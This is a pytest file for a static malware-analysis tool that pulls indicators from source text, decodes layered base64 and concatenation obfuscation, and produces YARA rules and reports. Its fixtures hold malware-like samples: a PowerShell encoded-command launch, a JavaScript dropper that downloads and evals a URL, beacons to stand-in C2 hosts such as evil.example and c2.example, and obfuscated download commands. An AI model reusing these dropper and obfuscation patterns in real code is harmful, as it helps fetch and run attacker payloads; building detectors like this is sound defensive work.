import base64

from loop_engineering.static_code_analysis import (
    analyze_source_text,
    decode_payload_layers,
    extract_functions,
    recover_concatenated_strings,
    render_static_code_blog_markdown,
    render_static_code_markdown,
    render_static_code_yara,
)


def test_static_analysis_extracts_iocs_and_execution_patterns():
    text = """
import os, subprocess
url = "http://evil.example/payload"
subprocess.Popen(["powershell", "-enc", "SQBFAFgA"])
eval("print(1)")
callback = "192.0.2.10"
"""

    report = analyze_source_text(text, language_hint="python")

    assert "http://evil.example/payload" in report.urls
    assert "192.0.2.10" in report.ips
    assert "evil.example" in report.domains
    categories = {finding.category for finding in report.findings}
    assert "dynamic_execution" in categories
    assert "shell_execution" in categories
    assert "powershell_cradle" in categories


def test_domain_extraction_ignores_source_member_access():
    text = """
var hbdakAhh = ojbkjknkinhS.Get("Win32_Process");
hbdakAhh = hbdakAhh.replace(/x/g, "").split(".");
var d = new ActiveXObject("Scripting.Dictionary");
beacon("kelvin654.duckdns.org");
"""

    report = analyze_source_text(text, language_hint="javascript")

    # Real C2 domain is kept; JS member access is not mistaken for a domain.
    assert "kelvin654.duckdns.org" in report.domains
    for noise in ("hbdakAhh.replace", "hbdakAhh.split", "ojbkjknkinhS.Get", "Scripting.Dictionary"):
        assert noise not in report.domains


def test_recover_concatenated_strings_undoes_token_obfuscation():
    src = (
        'var v = "powXXer";\n'
        'v += "shellXX http";\n'
        'v += "://eviXXl.example/x";\n'
        'v = v.replace(/XX/g, "");\n'
    )

    recovered = recover_concatenated_strings(src, min_length=5)

    assert any("powershell" in value and "evil.example" in value for value in recovered)


def test_extract_functions_annotates_behaviour():
    src = """
function harmless(a, b) { return a + b; }
function dropper(u) { var w = new ActiveXObject("MSXML2.XMLHTTP"); w.DownloadFile(u); eval(u); }
"""

    functions = {f["name"]: f for f in extract_functions(src)}

    assert functions["harmless"]["behaviour_markers"] == []
    assert "powershell_cradle" in functions["dropper"]["behaviour_markers"]
    assert "dynamic_execution" in functions["dropper"]["behaviour_markers"]


def test_decode_payload_layers_recovers_nested_base64_iocs():
    # Real droppers hide long base64; pad past the long-blob detection threshold.
    inner = "beacon to http://stage3.example/a.bin and 203.0.113.9 " + ("filler " * 10)
    b64 = base64.b64encode(inner.encode()).decode()
    text = f"var p = '{b64}';"

    layers = decode_payload_layers(text)

    assert any("http://stage3.example/a.bin" in layer["urls"] for layer in layers)
    assert any("203.0.113.9" in layer["ips"] for layer in layers)
    assert any("stage3.example" in layer["domains"] for layer in layers)


def test_full_chain_deobfuscation_surfaces_decoded_iocs():
    # concat+replace builds a command containing a base64 layer with the real host
    stage = base64.b64encode(b"download http://c2.example/p.bin " + b"x" * 60).decode()
    src = (
        f'var v = "ZZ{stage[:10]}";\n'
        f'v += "{stage[10:]}ZZ";\n'
        'v = v.replace(/ZZ/g, "");\n'
    )

    report = analyze_source_text(src, language_hint="javascript")

    decoded_hosts = {host for layer in report.decoded_layers for host in layer["domains"]}
    assert "c2.example" in decoded_hosts


def test_static_analysis_reports_obfuscation_without_execution():
    blob = "A" * 120
    report = analyze_source_text(f"payload = '{blob}'", language_hint="javascript")

    assert any(finding.category == "obfuscation" for finding in report.findings)
    markdown = render_static_code_markdown(report)
    assert "static text analysis only" in markdown


def test_static_analysis_generates_blog_and_yara():
    report = analyze_source_text('fetch("https://c2.example/a"); eval(code)', language_hint="javascript")

    blog = render_static_code_blog_markdown(report)
    yara = render_static_code_yara(report)

    assert "What The Agent Did" in blog
    assert "IOCs" in blog
    assert "YARA Rules" in blog
    assert "Static_Source_Malware_Indicators" in yara
    assert "c2.example" in yara
